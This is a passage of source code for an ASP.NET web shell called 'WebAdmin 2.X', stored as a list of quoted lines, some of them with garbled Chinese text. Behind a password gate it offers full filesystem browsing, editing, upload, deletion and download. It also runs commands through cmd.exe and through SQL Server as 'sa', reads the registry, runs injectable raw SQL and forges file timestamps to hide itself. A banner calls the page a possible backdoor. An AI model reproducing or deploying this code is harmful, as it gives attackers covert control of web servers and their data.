            "\t\t\t\tGetSize=temp\\1024\\1024\\1024 & \" GB\"",
            "\t\t\tend if",
            "\t\tend if",
            "\tend if",
            "End Function ",
            "\tSub downTheFile(thePath)",
            "\t\tdim stream",
            "\t\tstream=server.createObject(\"adodb.stream\")",
            "\t\tstream.open",
            "\t\tstream.type=1",
            "\t\tstream.loadFromFile(thePath)",
            "\t\tresponse.addHeader(\"Content-Disposition\", \"attachment; filename=\" & replace(server.UrlEncode(path.getfilename(thePath)),\"+\",\" \"))",
            "\t\tresponse.addHeader(\"Content-Length\",stream.Size)",
            "\t\tresponse.charset=\"UTF-8\"",
            "\t\tresponse.contentType=\"application/octet-stream\"",
            "\t\tresponse.binaryWrite(stream.read)",
            "\t\tresponse.flush",
            "\t\tstream.close",
            "\t\tstream=nothing",
            "\t\tresponse.End()",
            "\tEnd Sub",
            "Sub Page_Load(sender As Object, E As EventArgs)",
            "\tif request.QueryString(\"table\")<>\"\" then",
            "\t\tCall ShowTable()",
            "\tend if",
            "End Sub",
            "Sub ShowTable()",
            "\tDB_eButton.Visible = True",
            "\tDB_eString.Visible = True",
            "\tDB_exe.Visible = True",
            "\tDB_CString.Text = session(\"DBC\") ",
            "\tif instr(DB_CString.Text,\":\\\")<>0 then",
            "\t\tDB_rB_Access.Checked = true",
            "\t\tDB_rB_MSSQL.Checked = false",
            "\telse",
            "\t\tDB_rB_Access.Checked = false",
            "\t\tDB_rB_MSSQL.checked = true",
            "\tend if",
            "\tCall BindData()",
            "End Sub",
            "Sub DB_ReLoad(sender As Object, E As EventArgs)",
            "\tresponse.Redirect(request.ServerVariables(\"PATH_INFO\") & \"?action=data\")",
            "End Sub",
            "Sub DB_oneB(sender As Object, E As EventArgs)",
            "\tDim error_x as Exception",
            "\tTry",
            "\tDim db_conn As New OleDbConnection(session(\"DBC\"))",
            "\tDim db_cmd As New OleDbCommand( DB_EString.Text , db_conn ) ",
            "\tdb_conn.Open()",
            "\tdb_cmd.ExecuteNonQuery()",
            "\tdb_conn.Close()",
            "\tCall BindData()",
            "\tCatch error_x",
            "\tresponse.Write(\"<font color=\"\"red\"\"></font>\"&error_x.Message)",
            "\tresponse.End()",
            "\tEnd Try",
            "End Sub",
            "Sub DB_onrB_1(sender As Object, E As EventArgs)",
            "\tDB_CString.Text = \"server=(local);UID=sa;PWD=;database=dvnews;Provider=SQLOLEDB\"",
            "\tDB_rB_Access.Checked = false",
            "\tDB_rB_MSSQL.Checked = true",
            "End Sub",
            "Sub DB_onrB_2(sender As Object, E As EventArgs)",
            "\tDB_rB_Access.Checked = true",
            "\tDB_rB_MSSQL.Checked = false",
            "\tDB_CString.Text = \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\\MyWeb\\UpdateWebadmin\\guestbook.mdb\"",
            "End Sub",
            "Sub DB_onsB(sender As Object, E As EventArgs)",
            "\tDB_eButton.Visible = True",
            "\tDB_eString.Visible = True",
            "\tDB_exe.Visible = True",
            "\tsession(\"DBC\") = DB_CString.Text",
            "\tDim i As Integer",
            "\tDim db_conn As New OleDbConnection(DB_CString.Text)",
            "\tDim db_schemaTable As DataTable ",
            "\tdb_conn.open()",
            "\tdb_schemaTable = db_conn.GetOleDbSchemaTable(OleDbSchemaGuid.Tables, New Object() {Nothing, Nothing, Nothing, \"TABLE\"})",
            "\tFor i = 0 To db_schemaTable.Rows.Count - 1",
            "\t\tdb_Label.Text += \"<a href='?action=data&table=\" & db_schemaTable.Rows(i)!TABLE_NAME.ToString & \"'>\" & db_schemaTable.Rows(i)!TABLE_NAME.ToString & \"</a><br>\"",
            "\tNext i",
            "\tdb_conn.close()",
            "End Sub",
            "Sub DB_Page(sender As Object, e As System.Web.UI.WebControls.DataGridPageChangedEventArgs)",
            "\tDB_DataGrid.CurrentPageIndex = e.NewPageIndex",
            "\tCall BindData()",
            "End Sub",
            "Sub DB_Sort(sender As Object, E As DataGridSortCommandEventArgs)",
            "\tSORTFILED = E.SortExpression",
            "\tCall BindData()",
            "End Sub",
            "Sub BindData()",
            "\tDim db_conn As New OleDbConnection(session(\"DBC\"))",
            "\tDim db_cmd As New OleDbCommand(\"select * from \" & request.QueryString(\"table\") , db_conn ) ",
            "\tDim db_adp As New OleDbDataAdapter(db_cmd)",
            "\tDim db_ds As New DataSet()",
            "\tdb_adp.Fill(db_ds,request.QueryString(\"table\"))",
            "\tDB_DataGrid.DataSource = db_ds.Tables(request.QueryString(\"table\")).DefaultView",
            "\tdb_ds.Tables(request.QueryString(\"table\")).DefaultView.Sort = SORTFILED",
            "\tDB_DataGrid.DataBind()",
            "End Sub",
            "</script>",
            "if request.QueryString(\"action\")=\"down\" and session(\"lake2\")=1 then",
            "\t\tdownTheFile(request.QueryString(\"src\"))",
            "\t\tresponse.End()",
            "end if",
            "Dim hu as string = request.QueryString(\"action\")",
            "if hu=\"cmd\" then ",
            "TITLE=\"WebAdmin 2.X -- CMD\"",
            "elseif hu=\"sqlrootkit\" then ",
            "TITLE=\"WebAdmin 2.X -- SqlRootKit\"",
            "elseif hu=\"clonetime\" then ",
            "TITLE=\"WebAdmin 2.X -- CloneTime\"",
            "elseif hu=\"information\" then ",
            "TITLE=\"WebAdmin 2.X -- WebServerInfo\"",
            "elseif hu=\"reg\" then ",
            "TITLE=\"WebAdmin 2.X -- RegRead\"",
            "elseif hu=\"goto\" then ",
            "TITLE=\"WebAdmin 2.X -- FileManager\"",
            "elseif hu=\"data\" then ",
            "TITLE=\"WebAdmin 2.X -- ControlDataBase\"",
            "else ",
            "TITLE=request.ServerVariables(\"HTTP_HOST\") ",
            "end if",
            "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">",
            "<html>",
            "<style type=\"text/css\">",
            "body,td,th {",
            "\tcolor: #0000FF;",
            "\tfont-family: Verdana;",
            "body {",
            "\tbackground-color: #ffffff;",
            "\tfont-size:14px; ",
            "a:link {",
            "\tcolor: #0000FF;",
            "\ttext-decoration: none;",
            "a:visited {",
            "\ttext-decoration: none;",
            "\tcolor: #0000FF;",
            "a:hover {",
            "\ttext-decoration: none;",
            "\tcolor: #FF0000;",
            "a:active {",
            "\ttext-decoration: none;",
            "\tcolor: #FF0000;",
            ".buttom {color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5}",
            ".TextBox {border: 1px solid #084B8E}",
            ".style3 {color: #FF0000}",
            "</style>",
            "<head>",
            "<meta http-equiv=\"Content-Type\" content=\"text/html\" charset=gb2312>",
            "<title><%=TITLE%></title>",
            "</head>",
            "<body>",
            "Dim error_x as Exception",
            "if session(\"lake2\")<>1 then",
            "\tresponse.Write(\"<br>\")",
            "\tresponse.Write(\"Hello , thank you for using my program !<br>\")",
            "\tresponse.Write(\"This program is run at ASP.NET Environment and manage the web directory.<br>\")",
            "\tresponse.Write(\"Maybe this program looks like a backdoor , but I wish you like it and don't hack :p<br><br>\")",
            "\tresponse.Write(\"<span class=\"\"style3\"\">Notice:</span> only click \"\"Login\"\" to login.\")",
            "<form runat=\"server\">",
            "  Your Password:<asp:TextBox ID=\"TextBox\" runat=\"server\"  TextMode=\"Password\" class=\"TextBox\" />  ",
            "  <asp:Button  ID=\"Button\" runat=\"server\" Text=\"Login\" ToolTip=\"Click here to login\"  OnClick=\"login_click\" class=\"buttom\" />",
            "</form> ",
            "else",
            "\tdim temp as string",
            "\ttemp=request.QueryString(\"action\")",
            "\tif temp=\"\" then temp=\"goto\"",
            "\tselect case temp",
            "\tcase \"goto\"",
            "\t\tif request.QueryString(\"src\")<>\"\" then",
            "\t\t\tur1=request.QueryString(\"src\")",
            "\t\telse",
            "\t\t\tur1=server.MapPath(\".\") & \"\\\"",
            "\t\tend if",
            "\tcall existdir(ur1)",
            "\tdim xdir as directoryinfo",
            "\tdim mydir as new DirectoryInfo(ur1)",
            "\tdim hupo as string",
            "\tdim xfile as fileinfo",
            "<p align=\"center\">\u01f0\u013f",
            "<font color=red><%=ur1%></font></p>",
            "<table width=\"70%\"  border=\"0\" align=\"center\">",
            "  <tr>",
            "    <td width=\"13%\">Operate:</td>",
            "    <td width=\"87%\"><a href=\"?action=new&src=<%=server.UrlEncode(ur1)%>\" title=\"",
            "\" target=\"_blank\">",
            "</a>",
            "      <%if session(\"cutboard\")<>\"\" then%>",
            "      <a href=\"?action=plaster&src=<%=server.UrlEncode(ur1)%>\" title=\"\u0573\">\u0573</a>",
            "      <%else%>",
            "<%end if%>",
            "<a href=\"?action=upfile&src=<%=server.UrlEncode(ur1)%>\" title=\"\u03f4\u013c\" target=\"_blank\">\u03f4</a> <a href=\"?action=goto&src=\" & <%=server.MapPath(\".\")%> title=\"\u0635\u013c\u013f",
            "\"> </a><a href=\"?action=logout\" title=\"Exit\">\ubfea</a></td>",
            "  </tr>",
            "  <tr>",
            "    <td>",
            "\t\u05ea</td>",
            "    <td>",
            "dim i as integer",
            "for i =0 to Directory.GetLogicalDrives().length-1",
            " \tresponse.Write(\"<a href='?action=goto&src=\" & Directory.GetLogicalDrives(i) & \"'>\" & Directory.GetLogicalDrives(i) & \" </a>\")",
            "next",
            "</td>",
            "  </tr>",
            "  <tr>",
            "    <td>\u07e3</td>",
            "    <td><a href=\"?action=sqlrootkit\" target=\"_blank\">SqlRootKit.NET </a><a href=\"?action=cmd\" target=\"_blank\">CMD.NET</a> <a href=\"?action=clonetime&src=<%=server.UrlEncode(ur1)%>\" target=\"_blank\">CloneTime</a> <a href=\"?action=information\" target=\"_blank\">SysInfomation</a> <a href=\"?action=reg\" target=\"_blank\">ReadReg</a> <a href=\"?action=data\" target=\"_blank\">DataBase</a> </td>",
            "  </tr>",
            "</table>",
            "<hr noshade>",
            "<table width=\"90%\"  border=\"0\" align=\"center\">",
            "\t<tr>",
            "\t<td width=\"40%\"><strong></strong></td>",
            "\t<td width=\"15%\"><strong>\u0421</strong></td>",
            "\t<td width=\"20%\"><strong>\u07b8\u02b1</strong></td>",
            "\t<td width=\"25%\"><strong></strong></td>",
            "\t</tr>",
            "      <tr>",
            "        <td><%",
            "\t\thupo= \"<tr><td><a href='?action=goto&src=\" & server.UrlEncode(Getparentdir(ur1)) & \"'><i>|\u013f",
            "|</i></a></td></tr>\"",
            "\t\tresponse.Write(hupo)",
            "\t\tfor each xdir in mydir.getdirectories()",
            "\t\t\tresponse.Write(\"<tr>\")",
            "\t\t\tdim filepath as string ",
            "\t\t\tfilepath=server.UrlEncode(ur1 & xdir.name)",
            "\t\t\thupo= \"<td><a href='?action=goto&src=\" & filepath & \"\\\" & \"'>\" & xdir.name & \"</a></td>\"",
            "\t\t\tresponse.Write(hupo)",
            "\t\t\tresponse.Write(\"<td>&lt;dir&gt;</td>\")",
            "\t\t\tresponse.Write(\"<td>\" & Directory.GetLastWriteTime(ur1 & xdir.name) & \"</td>\")",
            "\t\t\thupo=\"<td><a href='?action=cut&src=\" & filepath & \"\\'  target='_blank'>\" & \"</a>|<a href='?action=copy&src=\" & filepath & \"\\'  target='_blank'></a>|<a href='?action=del&src=\" & filepath & \"\\'\" & \" onclick='return del(this);'>\u027e</a></td>\"",
            "\t\t\tresponse.Write(hupo)",
            "\t\t\tresponse.Write(\"</tr>\")",
            "\t\tnext",
            "\t\t%></td>",
            "  </tr>",
            "\t\t<tr>",
            "        <td><%",
            "\t\tfor each xfile in mydir.getfiles()",
            "\t\t\tdim filepath2 as string",
            "\t\t\tfilepath2=server.UrlEncode(ur1 & xfile.name)",
            "\t\t\tresponse.Write(\"<tr>\")",
            "\t\t\thupo=\"<td>\" & xfile.name & \"</td>\"",
            "\t\t\tresponse.Write(hupo)",
            "\t\t\thupo=\"<td>\" & GetSize(xfile.length) & \"</td>\"",
            "\t\t\tresponse.Write(hupo)",
            "\t\t\tresponse.Write(\"<td>\" & file.GetLastWriteTime(ur1 & xfile.name) & \"</td>\")",
            "\t\t\thupo=\"<td><a href='?action=edit&src=\" & filepath2 & \"' target='_blank'>\u0f2d</a>|<a href='?action=cut&src=\" & filepath2 & \"' target='_blank'></a>|<a href='?action=copy&src=\" & filepath2 & \"' target='_blank'>\u0573</a>|<a href='?action=rename&src=\" & filepath2 & \"' target='_blank'></a>|<a href='?action=down&src=\" & filepath2 & \"' onClick='return down(this);'></a>|<a href='?action=del&src=\" & filepath2 & \"' onClick='return del(this);'>\u027e</a></td>\"",
            "\t\t\tresponse.Write(hupo)",
            "\t\t\tresponse.Write(\"</tr>\")",
            "\t\tnext",
            "\t\tresponse.Write(\"</table>\")",
            "\t\t%></td>",
            "      </tr>",
            "</table>",
            "<script language=\"javascript\">",
            "function del()",
            "if(confirm(\"\u0176\u027e\")){return true;}",
            "else{return false;}",
            "function down()",
            "if(confirm(\"\u013c10M\u0368http\u042d\u0623\\n\u04aa\")){return true;}",
            "else{return false;}",
            "</script>",
            "case \"information\"",
            "\tdim CIP,CP as string",
            "\tif getIP()<>request.ServerVariables(\"REMOTE_ADDR\") then",
            "\t\t\tCIP=getIP()",
            "\t\t\tCP=request.ServerVariables(\"REMOTE_ADDR\")",
            "\telse",
            "\t\t\tCIP=request.ServerVariables(\"REMOTE_ADDR\")",
            "\t\t\tCP=\"None\"",
            "\tend if",
            "<table width=\"80%\"  border=\"1\" align=\"center\">",
            "  <tr>",
            "    <td colspan=\"2\"><span class=\"style3\">Web Server Information                 </span><i><a href=\"javascript:closewindow();\">\u0631</a></i></td>",
            "  </tr>",
            "  <tr>",
            "    <td width=\"40%\">Server IP</td>",
            "    <td width=\"60%\"><%=request.ServerVariables(\"LOCAL_ADDR\")%></td>",
            "  </tr>",
            "  <tr>",
            "    <td height=\"73\">Machine Name</td>",
            "    <td><%=Environment.MachineName%></td>",
            "  </tr>",
            "  <tr>",
            "    <td>Network Name</td>",
            "    <td><%=Environment.UserDomainName.ToString()%></td>",
            "  </tr>",
            "  <tr>",
            "    <td>User Name in this Process</td>",
            "    <td><%=Environment.UserName%></td>",
            "  </tr>",
            "  <tr>",
            "    <td>OS Version</td>",
            "    <td><%=Environment.OSVersion.ToString()%></td>",
            "  </tr>",
            "  <tr>",
            "    <td>Started Time</td>",
            "    <td><%=GetStartedTime(Environment.Tickcount)%> Hours</td>",
            "  </tr>",
            "  <tr>",
            "    <td>System Time</td>",
            "    <td><%=now%></td>",
            "  </tr>",
            "  <tr>",
            "    <td>IIS Version</td>",
            "    <td><%=request.ServerVariables(\"SERVER_SOFTWARE\")%></td>",
            "  </tr>",
            "  <tr>",
            "    <td>HTTPS</td>",
            "    <td><%=request.ServerVariables(\"HTTPS\")%></td>",
            "  </tr>",
            "  <tr>",
            "    <td>PATH_INFO</td>",
            "    <td><%=request.ServerVariables(\"PATH_INFO\")%></td>",
            "  </tr>",
            "  <tr>",
            "    <td>PATH_TRANSLATED</td>",
            "    <td><%=request.ServerVariables(\"PATH_TRANSLATED\")%></td>",
            "  <tr>",
            "    <td>SERVER_PORT</td>",
            "    <td><%=request.ServerVariables(\"SERVER_PORT\")%></td>",
            "  </tr>",
            "    <tr>",
            "    <td>SeesionID</td>",
            "    <td><%=Session.SessionID%></td>",
            "  </tr>",
            "  <tr>",
            "    <td colspan=\"2\"><span class=\"style3\">Client Infomation</span></td>",
            "  </tr>",
            "  <tr>",
            "    <td>Client Proxy</td>",
            "    <td><%=CP%></td>",
            "  </tr>",
            "  <tr>",
            "    <td>Client IP</td>",
            "    <td><%=CIP%></td>",
            "  </tr>",
            "  <tr>",
            "    <td>User</td>",
            "    <td><%=request.ServerVariables(\"HTTP_USER_AGENT\")%></td>",
            "  </tr>",
            "</table>",
            "\tcase \"cmd\"",
            "<form runat=\"server\">",
            "  <p>[ CMD.NET for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href=\"javascript:closewindow();\">Close</a></i></p>",
            "  <p> Execute command with ASP.NET account(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p>",
            "  <p>CMD.exe's Path: ",
            "    <asp:TextBox ID=\"cmdpath\" runat=\"server\" class=\"TextBox\" Text=\"cmd.exe\"/>      </p>",
            "  Command:",
            "  <asp:TextBox ID=\"cmd\" runat=\"server\" Width=\"300\" class=\"TextBox\" />",
            "  <asp:Button ID=\"Button123\" runat=\"server\" Text=\"Run\" OnClick=\"RunCMD\" class=\"buttom\"/>  ",
            "  <p>",
            "   <asp:Label ID=\"result\" runat=\"server\" style=\"style2\"/>      </p>",
            "</form>",
            "\tcase \"sqlrootkit\"",
            "<form runat=\"server\">",
            "  <p>[ SqlRootKit.NET for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href=\"javascript:closewindow();\">Close</a></i></p>",
            "  <p> Execute command with SQLServer account(<span class=\"style3\">Notice: only click \"Run\" to run</span>)</p>",
            "  <p>Host:",
            "    <asp:TextBox ID=\"ip\" runat=\"server\" Width=\"300\" class=\"TextBox\" Text=\"127.0.0.1\"/></p>",
            "  <p>",
            "  SQL Name:",
            "    <asp:TextBox ID=\"SqlName\" runat=\"server\" Width=\"50\" class=\"TextBox\" Text='sa'/>",
            "  SQL Password:",
            "  <asp:TextBox ID=\"SqlPass\" runat=\"server\" Width=\"80\" class=\"TextBox\"/>",
            "  </p>",
            "  Command:",
            "  <asp:TextBox ID=\"Sqlcmd\" runat=\"server\" Width=\"300\" class=\"TextBox\"/>",
            "  <asp:Button ID=\"ButtonSQL\" runat=\"server\" Text=\"Run\" OnClick=\"RunSQLCMD\" class=\"buttom\"/>  ",
            "  <p>",
            "   <asp:Label ID=\"resultSQL\" runat=\"server\" style=\"style2\"/>      </p>",
            "</form>",
            "\tcase \"del\"",
            "\t\tdim a as string",
            "\t\ta=request.QueryString(\"src\")",
            "\t\tcall existdir(a)",
            "\t\tcall del(a)  ",
            "\t\tresponse.Write(\"<script>alert(\"\"\u027e\u013c \" & replace(a,\"\\\",\"\\\\\") & \" \u0279\"\");location.href='\"& request.ServerVariables(\"URL\") & \"?action=goto&src=\"& server.UrlEncode(Getparentdir(a)) &\"'</script>\")",
            "\tcase \"copy\"",
            "\t\tcall existdir(request.QueryString(\"src\"))",
            "\t\tsession(\"cutboard\")=\"",
            "\" & request.QueryString(\"src\")",
            "\t\tresponse.Write(\"<script>alert('\u013c\u047e\u01b5\u0430\u58ec\u013f\u013c\u0435\u0573\u0263');location.href='JavaScript:self.close()';</script>\")",
            "\tcase \"cut\"",
            "\t\tcall existdir(request.QueryString(\"src\"))",
            "\t\tsession(\"cutboard\")=\"",
            "\" & request.QueryString(\"src\")",
            "\t\tresponse.Write(\"<script>alert('\u013c\u047e\u0435\u0430\u58ec\u013f\u013c\u0435\u0573\u0263');location.href='JavaScript:self.close()';</script>\")",
            "\tcase \"plaster\"",
            "\t\tdim ow as integer",
            "\t\tif request.Form(\"OverWrite\")<>\"\" then ow=1",
            "\t\tif request.Form(\"Cancel\")<>\"\" then ow=2",
            "\t\tur1=request.QueryString(\"src\")",
            "\t\tcall existdir(ur1)",
            "\t\tdim d as string",
            "\t\td=session(\"cutboard\")",
            "\t\tif left(d,1)=\"",
            "\" then",
            "\t\t\tTEMP1=ur1 & path.getfilename(mid(replace(d,\"",
            "\",\"\"),1,len(replace(d,\"",
            "\",\"\"))-1))",
            "\t\t\tTEMP2=ur1 & replace(path.getfilename(d),\"",
            "\",\"\")",
            "\t\t\tif right(d,1)=\"\\\" then   ",
            "\t\t\t\tcall xexistdir(TEMP1,ow)",
            "\t\t\t\tdirectory.move(replace(d,\"",
            "\",\"\"),TEMP1 & \"\\\")  ",
            "\t\t\t\tresponse.Write(\"<script>alert('  \" & replace(replace(d,\"",
            "\",\"\"),\"\\\",\"\\\\\") & \"    \" & replace(TEMP1 & \"\\\",\"\\\",\"\\\\\") & \"  \u0279');location.href='\"& request.ServerVariables(\"URL\") & \"?action=goto&src=\"& server.UrlEncode(ur1) &\"'</script>\")",
            "\t\t\telse",
            "\t\t\t\tcall xexistdir(TEMP2,ow)",
            "\t\t\t\tfile.move(replace(d,\"",
            "\",\"\"),TEMP2)",
            "\t\t\t\tresponse.Write(\"<script>alert('  \" & replace(replace(d,\"",
            "\",\"\"),\"\\\",\"\\\\\") & \"    \" & replace(TEMP2,\"\\\",\"\\\\\") & \"  \u0279');location.href='\"& request.ServerVariables(\"URL\") & \"?action=goto&src=\"& server.UrlEncode(ur1) &\"'</script>\")",
            "\t\t\tend if",
            "\t\telse",
            "\t\t\tTEMP1=ur1 & path.getfilename(mid(replace(d,\"",
            "\",\"\"),1,len(replace(d,\"",
            "\",\"\"))-1))",
            "\t\t\tTEMP2=ur1 & path.getfilename(replace(d,\"",
            "\",\"\"))",
            "\t\t\tif right(d,1)=\"\\\" then ",
            "\t\t\t\tcall xexistdir(TEMP1,ow)",
            "\t\t\t\tdirectory.createdirectory(TEMP1)",
            "\t\t\t\tcall copydir(replace(d,\"",
            "\",\"\"),TEMP1 & \"\\\")",
            "\t\t\t\tresponse.Write(\"<script>alert('  \" & replace(replace(d,\"",
            "\",\"\"),\"\\\",\"\\\\\") & \"    \" & replace(TEMP1 & \"\\\",\"\\\",\"\\\\\") & \"  \u0279');location.href='\"& request.ServerVariables(\"URL\") & \"?action=goto&src=\"& server.UrlEncode(ur1) &\"'</script>\")",
            "\t\t\telse",
            "\t\t\t\tcall xexistdir(TEMP2,ow)",
            "\t\t\t\tfile.copy(replace(d,\"",
            "\",\"\"),TEMP2)",
            "\t\t\t\tresponse.Write(\"<script>alert('  \" & replace(replace(d,\"",
            "\",\"\"),\"\\\",\"\\\\\") & \"    \" & replace(TEMP2,\"\\\",\"\\\\\") & \"  \u0279');location.href='\"& request.ServerVariables(\"URL\") & \"?action=goto&src=\"& server.UrlEncode(ur1) &\"'</script>\")",
            "\t\t\tend if",
            "\t\tend if",
            "\tcase \"upfile\"",
            "\t\tur1=request.QueryString(\"src\")",
            "<form name=\"UpFileForm\" enctype=\"multipart/form-data\" method=\"post\" action=\"?src=<%=server.UrlEncode(ur1)%>\" runat=\"server\"  onSubmit=\"return checkname();\">",
            " \u3f6b\u03f4\u013c\u013f",
            " <span class=\"style3\"><%=ur1%></span><br>",
            " \u0461\u04aa\u013c\u0263",
            " <input name=\"upfile\" type=\"file\" class=\"TextBox\" id=\"UpFile\" runat=\"server\">",
            "    <input type=\"submit\" id=\"UpFileSubit\" value=\"Upload\" runat=\"server\" onserverclick=\"UpLoad\" class=\"buttom\">",
            "</form>",
            "<a href=\"javascript:history.back(1);\" style=\"color:#FF0000\"></a>",
            "\tcase \"new\"",
            "\t\tur1=request.QueryString(\"src\")",
            "<form runat=\"server\">",
            "  <%=ur1%><br>",
            "  <asp:TextBox ID=\"NewName\" TextMode=\"SingleLine\" runat=\"server\" class=\"TextBox\"/>",
            "  <br>",
            "  <asp:RadioButton ID=\"NewFile\" Text=\"File\" runat=\"server\" GroupName=\"New\" Checked=\"true\"/>",
            "  <asp:RadioButton ID=\"NewDirectory\" Text=\"Directory\" runat=\"server\"  GroupName=\"New\"/> ",
            "  <br>",
            "  <asp:Button ID=\"NewButton\" Text=\"Submit\" runat=\"server\" CssClass=\"buttom\"  OnClick=\"NewFD\"/>  ",
            "  <input name=\"Src\" type=\"hidden\" value=\"<%=ur1%>\">",
            "</form>",
            "<a href=\"javascript:history.back(1);\" style=\"color:#FF0000\"></a>",
            "\tcase \"edit\"",
            "\t\tdim b as string",
            "\t\tb=request.QueryString(\"src\")",
            "\t\tcall existdir(b)",
            "\t\tdim myread as new streamreader(b,encoding.default)",
            "\t\tfilepath.text=b",
            "\t\tcontent.text=myread.readtoend",
            "<form runat=\"server\">",
            "  <table width=\"80%\"  border=\"1\" align=\"center\">",
            "    <tr>      <td width=\"11%\">",
            "</td>",
            "      <td width=\"89%\">",
            "      <asp:TextBox CssClass=\"TextBox\" ID=\"filepath\" runat=\"server\" Width=\"300\"/>",
            "      *</td>",
            "    </tr>",
            "    <tr>",
            "      <td></td> ",
            "      <td> <asp:TextBox ID=\"content\" Rows=\"25\" Columns=\"100\" TextMode=\"MultiLine\" runat=\"server\" CssClass=\"TextBox\"/></td>",
            "    </tr>",
            "    <tr>",
            "      <td></td>",
            "      <td> <asp:Button ID=\"a\" Text=\"Sumbit\" runat=\"server\" OnClick=\"Editor\" CssClass=\"buttom\"/>         ",
            "      </td>",
            "    </tr>",
            "  </table>",
            "</form>",
            "<a href=\"javascript:history.back(1);\" style=\"color:#FF0000\"></a>",
            "  \t\tmyread.close",
            "\tcase \"rename\"",
            "\t\tur1=request.QueryString(\"src\")",
            "\t\tif request.Form(\"name\")=\"\" then",
            "<form name=\"formRn\" method=\"post\" action=\"?action=rename&src=<%=server.UrlEncode(request.QueryString(\"src\"))%>\" onSubmit=\"return checkname();\">",
            "  <p>\u3f6b <span class=\"style3\"><%=request.QueryString(\"src\")%></span> \u03aa <%=getparentdir(request.QueryString(\"src\"))%>",
            "    <input type=\"text\" name=\"name\" class=\"TextBox\">",
            "    <input type=\"submit\" name=\"Submit3\" value=\"Submit\" class=\"buttom\">",
            "</p>",
            "</form>",
            "<a href=\"javascript:history.back(1);\" style=\"color:#FF0000\"></a>",
            "<script language=\"javascript\">",
            "function checkname()",
            "if(formRn.name.value==\"\"){alert(\"\u04e6\u013c :(\");return false}",
            "</script>",
            "  <%",
            "\t\telse",
            "\t\t\tif Rename() then",
            "\t\t\t\tresponse.Write(\"<script>alert(' \" & replace(ur1,\"\\\",\"\\\\\") & \" \u03aa \" & replace(Getparentdir(ur1) & request.Form(\"name\"),\"\\\",\"\\\\\") & \" \u0279\u02e2\u05ae');location.href='JavaScript:self.close()';</script>\")",
            "\t\t\telse",
            "\t\t\t\tresponse.Write(\"<script>alert('\u036c\u013c\u02a7 :(');location.href='JavaScript:self.close()';</script>\")",
            "\t\t\tend if",
            "\t\tend if",
            "\tcase \"samename\"",
            "\t\tur1=request.QueryString(\"src\")",
            "<form name=\"form1\" method=\"post\" action=\"?action=plaster&src=<%=server.UrlEncode(ur1)%>\">",
            "<p class=\"style3\">\u036c\u013c\u01f7\ud9a3\udcb8\u01e3\u0461NO\u04bd\u0536\u04bb\u01f0\u05fa</p>",
            "  <input name=\"OverWrite\" type=\"submit\" id=\"OverWrite\" value=\"Yes\" class=\"buttom\">",
            "<input name=\"Cancel\" type=\"submit\" id=\"Cancel\" value=\"No\" class=\"buttom\">",
            "</form>",
            "<a href=\"javascript:history.back(1);\" style=\"color:#FF0000\"></a>",
            "   <%",
            "    case \"clonetime\"",
            "\t\ttime1.Text=request.QueryString(\"src\")&\"webadmin2X.aspx\"",
            "\t\ttime2.Text=request.QueryString(\"src\")",
            "<form runat=\"server\">",
            "  <p>[CloneTime for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"javascript:closewindow();\">\u0631</a></i> </p>",
            "  <p>A tool that it copy the file or directory's time to another file or directory </p>",
            "  <p>Rework File or Dir:",
            "    <asp:TextBox CssClass=\"TextBox\" ID=\"time1\" runat=\"server\" Width=\"300\"/></p>",
            "  <p>Copied File or Dir:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;",
            "    <asp:TextBox CssClass=\"TextBox\" ID=\"time2\" runat=\"server\" Width=\"300\"/></p>",
            "<asp:Button ID=\"ButtonClone\" Text=\"Submit\" runat=\"server\" CssClass=\"buttom\" OnClick=\"CloneTime\"/>",
            "</form>",
            "  <%",
            "    case \"reg\"",
            "  %>",
            "<form runat=\"server\">",
            "  <p>[Read Reg for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"javascript:closewindow();\">\u0631</a></i> </p>",
            "  <p>A tool that it can read regedit </p>",
            " Key : <asp:TextBox ID=\"Reg1\" runat=\"server\" Width=\"500\" CssClass=\"TextBox\" Text=\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"/>  ",
            "<br>",
            "  Value: ",
            "  <asp:TextBox ID=\"Reg2\" runat=\"server\" CssClass=\"TextBox\" Text=\"KAVRun\"/>  ",
            "<asp:Button ID=\"RegButtom\" runat=\"server\" Text=\"Sumbit\" OnClick=\"ReadReg\" CssClass=\"buttom\"/>  ",
            "</form>",
            "<asp:Label ID=\"Label1\" runat=\"server\" />",
            "  <%",
            "  \tcase \"data\"",
            "  %>",
            "<form runat=\"server\">",
            "  <p>[Control DataBase for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"javascript:closewindow();\">\u0631</a></i> </p>",
            "  <p>A tool that it can Control Database </p>",
            "<p><asp:Button Text=\"ReLoad\" OnClick=\"DB_ReLoad\" runat=\"server\" CssClass=\"buttom\"></asp:Button></p>",
            "  <p>Connection String : ",
            "    <asp:TextBox ID=\"DB_CString\" Width=\"500\" runat=\"server\" CssClass=\"TextBox\"/>      </p>",
            "  <p>Select Database:",
            "  <asp:RadioButton ID=\"DB_rB_MSSQL\" Text=\"MSSQL\" GroupName=\"DBSelecting\" OnCheckedChanged=\"DB_onrB_1\" AutoPostBack=\"true\" runat=\"server\" CssClass=\"buttom\"/>",
            "  <asp:RadioButton ID=\"DB_rB_Access\" Text=\"Access\" GroupName=\"DBSelecting\" OnCheckedChanged=\"DB_onrB_2\" AutoPostBack=\"true\" runat=\"server\" CssClass=\"buttom\"/>   ",
            "  <asp:Button ID=\"DB_sButton\" runat=\"server\" Text=\"Submit\" OnClick=\"DB_onsB\" CssClass=\"buttom\"/>  ",
            "  </p> ",
            "  <p><asp:Label ID=\"db_Label\" runat=\"server\"></asp:Label></p>",
            "    <p>",
            "\t<asp:Label ID=\"DB_exe\" Text=\"Execute SQL ( No echo ): \" Visible=\"false\" runat=\"server\"/>",
